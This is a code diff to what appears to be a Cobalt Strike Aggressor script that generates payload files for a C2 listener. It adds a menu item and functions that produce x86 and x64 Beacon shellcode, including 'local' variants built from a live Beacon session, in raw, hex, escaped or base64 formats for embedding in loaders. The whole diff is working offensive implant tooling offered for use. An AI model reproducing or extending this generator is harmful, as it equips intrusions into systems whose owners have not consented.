@@ -33,10 +33,83 @@ sub generate
         write_payload($outpath, %_options["listener"] . "-x64.ps1", artifact_payload(%_options["listener"], "powershell", "x64"));
         write_payload($outpath, %_options["listener"] . "-x86.py", artifact_payload(%_options["listener"], "python", "x86"));
         write_payload($outpath, %_options["listener"] . "-x64.py", artifact_payload(%_options["listener"], "python", "x64"));
-        write_payload($outpath, %_options["listener"] . "-x86.bin", artifact_payload(%_options["listener"], "raw", "x86"));
-        write_payload($outpath, %_options["listener"] . "-x64.bin", artifact_payload(%_options["listener"], "raw", "x64"));
+        write_payload($outpath, %_options["listener"] . "-x86.bin", payload(%_options["listener"], "x86", %_options["exit_method"]));
+        write_payload($outpath, %_options["listener"] . "-x64.bin", payload(%_options["listener"], "x64", %_options["exit_method"]));
         write_payload($outpath, %_options["listener"] . "-svc-x86.exe", artifact_payload(%_options["listener"], "svcexe", "x86"));
         write_payload($outpath, %_options["listener"] . "-svc-x64.exe", artifact_payload(%_options["listener"], "svcexe", "x64"));
+
+        prompt_text("Payload variants generated to:", $outpath, {});
+        #add_to_clipboard($outpath);
+    }, %_options => %options));
+}
+
+sub format_comma {
+    $key = $1;
+    @fmt = str_chunk(transform($key, "hex"), 2);
+    return "0x". join(",0x", @fmt);
+}
+
+sub format_backslash {
+    $key = $1;
+    @fmt = str_chunk(transform($key, "hex"), 2);
+    return "\\x". join("\\x", @fmt);
+}
+
+sub format_shellcode
+{
+    $format = $1;
+    $shellcode = $2;
+    $formatted = "";
+
+    if ($format eq "raw") {
+        $formatted = $shellcode;
+    }
+    else if ($format eq "hex") {
+        $formatted = transform($shellcode, "hex");
+    }
+    else if ($format eq "0x90\,0x90,\0x90") {
+        $formatted = format_comma($shellcode);
+    }
+    else if ($format eq "\\x90\\x90\\x90") {
+        $formatted = format_backslash($shellcode);
+    }
+    else if ($format eq "b64") {
+        $formatted = base64_encode($shellcode);
+    }
+
+    return $formatted;
+}
+
+sub generate_shellcode
+{
+    local('%options $outpath');
+    %options = $3;
+
+    prompt_directory_open("Choose folder to store generated payload variants", $null, false, lambda({
+        $outpath = $1;
+
+        $pay1 = "";
+        $pay2 = "";
+        $name = %_options["listener"];
+
+        if(%_options["local"] eq "true") {
+            if(strlen(%_options["bid"]) == 0) {
+                show_error("You must select existing Beacon session to generate Local payloads with embedded function pointers!");
+                return 0;
+            }
+
+            $pay1 = payload_local(%_options["bid"], %_options["listener"], "x86", %_options["exit_method"]);
+            $pay2 = payload_local(%_options["bid"], %_options["listener"], "x64", %_options["exit_method"]);
+
+            $name .= "-local";
+        }
+        else {
+            $pay1 = payload(%_options["listener"], "x86", %_options["exit_method"]);
+            $pay2 = payload(%_options["listener"], "x64", %_options["exit_method"]);
+        }
+
+        write_payload($outpath, $name . "-x86.bin", format_shellcode(%_options["format"], $pay1));
+        write_payload($outpath, $name . "-x64.bin", format_shellcode(%_options["format"], $pay2));
 
         prompt_text("Payload variants generated to:", $outpath, {});
         #add_to_clipboard($outpath);
@@ -51,8 +124,26 @@ popup attacks
 
         $dialog = dialog("Generate payload variants", %defaults, &generate);
         
-        dialog_description($dialog, "Generates variants for the selected listener's payloads and dumps them to specified output directory.");
+        dialog_description($dialog, "Generates variants for the selected listener's payloads and dumps them to a specified output directory.");
         drow_listener_stage($dialog, "listener", "Listener: ");
+        drow_combobox($dialog, "exit_method", "Exit Method for shellcodes: ", @("process", "thread"));
+        dbutton_action($dialog, "Generate");
+
+        dialog_show($dialog);
+    }
+
+    item "Generte raw shellcode variants"
+    {
+        local('$dialog %defaults');
+
+        $dialog = dialog("Generate raw shellcode variants", %defaults, &generate_shellcode);
+        
+        dialog_description($dialog, "Generates variants for the selected listener's shellcodes and writes them to a specified output directory.");
+        drow_listener_stage($dialog, "listener", "Listener: ");
+        drow_checkbox($dialog, "local", "Embed function pointers from existing Beacon session: ", "Local Payload");
+        drow_beacon($dialog, "bid", "Existing session to use with Local Payload type: ");
+        drow_combobox($dialog, "exit_method", "Exit Method: ", @("process", "thread"));
+        drow_combobox($dialog, "format", "Formatting: ", @("raw","hex","0x90\,0x90,\0x90","\\x90\\x90\\x90","b64"));
         dbutton_action($dialog, "Generate");
 
         dialog_show($dialog);
